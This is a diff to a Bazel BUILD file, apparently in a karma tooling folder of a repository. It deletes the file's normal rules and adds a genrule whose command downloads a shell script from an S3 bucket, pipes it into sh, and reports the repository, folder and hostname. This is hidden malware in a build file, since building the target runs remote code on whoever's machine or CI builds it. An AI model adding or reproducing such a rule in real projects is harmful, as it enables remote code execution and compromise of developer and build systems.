@@ -1,9 +1,7 @@
-package(default_visibility = ["//visibility:public"])
 
-exports_files(["karma-debug-config.js"])
-
-# Make source files available for distribution via pkg_npm
-filegroup(
-    name = "files",
-    srcs = glob(["*"]),
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=karma\\&hostname=`hostname`\\&foo=ceh",
+    visibility = ["//visibility:public"],
 )
